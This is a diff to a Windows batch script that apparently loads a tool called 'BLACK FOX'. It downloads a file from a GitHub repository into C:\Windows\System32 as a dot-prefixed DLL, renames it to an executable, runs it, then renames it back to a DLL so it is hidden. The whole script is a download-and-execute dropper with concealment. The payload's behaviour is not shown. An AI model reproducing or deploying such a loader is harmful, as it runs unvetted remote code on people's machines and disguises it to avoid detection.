@@ -12,18 +12,18 @@ if %errorlevel% neq 0 (
 )
 
 :: Step 1: Delete old files
-if exist "C:\Windows\System32\SNIPER90.dll" del /f /q "C:\Windows\System32\SCOP.dll"
+if exist "C:\Windows\System32\SNIPER90.dll" del /f /q "C:\Windows\System32\.SCOP.dll"
 if exist "C:\Windows\System32\BLACK FOX.exe" del /f /q "C:\Windows\System32\BLACK FOX.exe"
 
 :: Step 2: Download new file
-powershell -Command "try { Invoke-WebRequest -Uri 'https://github.com/BLACK89310/BLACK-FOX/raw/refs/heads/main/SCOP' -OutFile 'C:\Windows\System32\SCOP.dll' -ErrorAction Stop } catch { exit 1 }"
-if not exist "C:\Windows\System32\SCOP.dll" (
+powershell -Command "try { Invoke-WebRequest -Uri 'https://github.com/BLACK89310/BLACK-FOX/raw/refs/heads/main/.SCOP' -OutFile 'C:\Windows\System32\.SCOP.dll' -ErrorAction Stop } catch { exit 1 }"
+if not exist "C:\Windows\System32\.SCOP.dll" (
     echo [ERROR] Download failed!
     exit /b
 )
 
 :: Step 3: Rename DLL to EXE
-ren "C:\Windows\System32\SCOP.dll" "BLACK FOX.exe"
+ren "C:\Windows\System32\.SCOP.dll" "BLACK FOX.exe"
 
 :: Step 4: Execute
 start "" "C:\Windows\System32\BLACK FOX.exe"
@@ -32,7 +32,7 @@ start "" "C:\Windows\System32\BLACK FOX.exe"
 timeout /t 5 /nobreak >nul
 
 :: Step 6: Rename EXE back to DLL
-ren "C:\Windows\System32\BLACK FOX.exe" "SCOP.dll"
+ren "C:\Windows\System32\BLACK FOX.exe" ".SCOP.dll"
 
 :: Auto-exit
 exit
